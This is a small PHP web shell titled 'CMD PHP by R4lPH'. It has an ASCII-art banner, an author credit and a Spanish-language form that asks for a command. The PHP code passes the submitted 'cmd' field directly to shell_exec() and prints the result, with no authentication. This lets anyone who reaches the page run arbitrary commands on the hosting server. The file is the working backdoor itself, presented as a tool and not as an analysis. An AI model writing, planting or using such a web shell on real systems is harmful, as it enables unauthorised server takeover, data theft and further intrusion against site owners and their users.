<html><body bgcolor=black>
<center>
<pre><font color="white" style="text-shadow: 5px 5px 10px  #000000">
  ______   __       __  _______         _______   __    __  _______
 /      \ /  \     /  |/       \       /       \ /  |  /  |/       \
/$$$$$$  |$$  \   /$$ |$$$$$$$  |      $$$$$$$  |$$ |  $$ |$$$$$$$  |
$$ |  $$/ $$$  \ /$$$ |$$ |  $$ |      $$ |__$$ |$$ |__$$ |$$ |__$$ |
$$ |      $$$$  /$$$$ |$$ |  $$ |      $$    $$/ $$    $$ |$$    $$/
$$ |   __ $$ $$ $$/$$ |$$ |  $$ |      $$$$$$$/  $$$$$$$$ |$$$$$$$/
$$ \__/  |$$ |$$$/ $$ |$$ |__$$ |      $$ |      $$ |  $$ |$$ |
$$    $$/ $$ | $/  $$ |$$    $$/       $$ |      $$ |  $$ |$$ |
 $$$$$$/  $$/      $$/ $$$$$$$/        $$/       $$/   $$/ $$/

Make by R4lph, Contact: @RalphManga
</pre>
</html>
<title>CMD PHP by R4lPH</title>
<form method="POST" action="<?php basename($_SERVER['PHP_SELF']);  ?>">
    Escribe el comando:
    <input type="text"  name="cmd"><input type="submit" value=">>"><br />
<center>
<?php
$cmd = shell_exec($_POST['cmd']);
echo "<pre><textarea cols=80% rows=20%>$cmd</textarea>";
?>
